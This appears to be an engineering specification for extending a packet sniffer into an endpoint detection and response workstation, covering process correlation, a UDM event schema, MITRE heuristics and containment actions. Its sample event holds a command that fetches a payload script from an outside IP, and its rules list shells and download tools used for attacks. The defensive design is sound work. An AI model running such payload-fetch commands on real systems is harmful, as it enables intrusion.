# Architecture & Engineering Specification: SentinelShark EDR/SecOps Transformation

This specification provides the technical blueprint to transition **SentinelShark** from a passive network packet sniffer into a host-aware **Endpoint Detection and Response (EDR)** and **SecOps** workstation.

---

## 1. Architectural Strategy

The project merges host-level process telemetry with packet dissection and external threat intelligence APIs (VirusTotal, AbuseIPDB, IPinfo, Shodan):

```
+----------------------------------------------------------------------------------------------------+
|                                           HOST SYSTEM                                              |
|                                                                                                    |
|   +-----------------------+     +--------------------------+     +-----------------------------+   |
|   |  TShark / Libpcap     |     |   psutil / Socket Map    |     |  Disk & Hash Forensics      |   |
|   |  (5-Tuple Extraction) |     |   (Local PID Correlation)|     |  (SHA-256, Binary Path, CLI)|   |
|   +-----------+-----------+     +------------+-------------+     +--------------+--------------+   |
|               |                              |                                  |                  |
|               +----------------------+       |       +--------------------------+                  |
|                                      v       v       v                                             |
|                             +--------------------------------+                                     |
|                             |   Telemetry Enrichment Engine  |                                     |
|                             +----------------+---------------+                                     |
|                                              |                                                     |
|                                              v                                                     |
|                             +--------------------------------+                                     |
|                             | Google SecOps UDM Normalizer   |                                     |
|                             +----------------+---------------+                                     |
|                                              |                                                     |
|                       +----------------------+-----------------------+                             |
|                       v                                              v                             |
|        +-----------------------------+                +-----------------------------+              |
|        | Detection & MITRE Engine    |                | EDR Active Response Engine  |              |
|        | - Rule evaluation           |                | - Process Termination       |              |
|        | - Threat Intel scoring      |                | - Local Firewall IP Drop    |              |
|        +--------------+--------------+                | - File Quarantine           |              |
|                       |                               +--------------+--------------+              |
|                       +----------------------+-----------------------+                             |
|                                              v                                                     |
|                               +-----------------------------+                                      |
|                               |  PyQt6 SOC/EDR Dashboard    |                                      |
|                               +-----------------------------+                                      |
+----------------------------------------------------------------------------------------------------+

```

---

## 2. Core Feature Specifications

### Feature 1: Socket-to-Process Correlation Engine

* **Objective:** Map inbound and outbound network flows directly to local host binaries.
* **Mechanism:**
* Extract 5-tuple: `(src_ip, src_port, dst_ip, dst_port, protocol)` per packet.
* Poll system socket tables using `psutil.net_connections(kind='inet')`.
* Retrieve:
* Process ID (`PID`) and Parent Process ID (`PPID`)
* Executable Name & Disk Path (`proc.exe()`)
* Full Command-Line Execution String (`proc.cmdline()`)
* Execution User / Privilege Context (`proc.username()`)
* File SHA-256 hash (computed in a separate background thread).





### Feature 2: Google SecOps UDM (Unified Data Model) Normalizer

* **Objective:** Structure every combined network-host event into a standardized UDM JSON schema.
* **Schema Definition:**
```json
{
  "metadata": {
    "event_timestamp": "2026-09-03T10:30:00Z",
    "event_type": "NETWORK_CONNECTION",
    "product_name": "SentinelShark-EDR"
  },
  "principal": {
    "hostname": "workstation-01",
    "user": {"userid": "analyst"},
    "process": {
      "pid": 4821,
      "ppid": 1024,
      "name": "curl",
      "command_line": "curl -s http://185.220.101.5/payload.sh",
      "file": {"sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"}
    }
  },
  "target": {
    "ip": "185.220.101.5",
    "port": 80
  },
  "security_result": {
    "category": "COMMAND_AND_CONTROL",
    "summary": "Outbound connection to known malicious node",
    "mitre_attack": ["T1071", "T1059"]
  }
}

```



### Feature 3: MITRE ATT&CK & Behavioral Heuristics

* **Rule Definitions:**
* **Command Line Interpreters with Sockets (`T1059`):** Flag outbound TCP/UDP connections initiated by `bash`, `sh`, `zsh`, `python`, `powershell.exe`, or `cmd.exe`.
* **Living-off-the-Land Binaries (`T1105`):** Flag download tools (`curl`, `wget`, `certutil.exe`, `bitsadmin.exe`) communicating with non-RFC1918 addresses.
* **C2 / Beaconing Detection (`T1071`):** Detect repeated outbound requests to the same remote host occurring at strict delta intervals (low jitter).



### Feature 4: Active Remediation & Containment ("The Response Engine")

* **Process Termination:** Send `SIGKILL` (`kill -9`) or call `TerminateProcess` directly on the offending PID.
* **Dynamic Host Firewall Drop:** Block the remote IP instantly:
* **macOS / BSD:** Inject anchor rule via `pfctl`.
* **Linux:** Inject rule via `iptables -A OUTPUT -d <IP> -j DROP`.


* **File Quarantine:** Relocate the suspicious executable to a locked `.quarantine` folder and revoke executable permissions (`chmod -x`).

---

## 3. UI Modifications (PyQt6 Layout)

1. **Packet & Telemetry Table:**
* Add columns: `PID` and `PROCESS` right after `TIME`.
* Add column: `MITRE TAG` right before `THREAT SCORE`.


2. **Inspector Panel (Bottom-Left):**
* Introduce a third collapsible section: `Host & Process Forensics`.
* Display: Command Line, File Path, SHA-256 Hash, Parent Process, and User Context.


3. **EDR Action Toolbar (Bottom Container):**
* Add interactive action buttons:
* `[ ⛔ Kill Process ]`
* `[ 🛡️ Block Remote IP ]`
* `[ 📦 Quarantine Binary ]`
* `[ 📋 Export UDM Event ]`





---

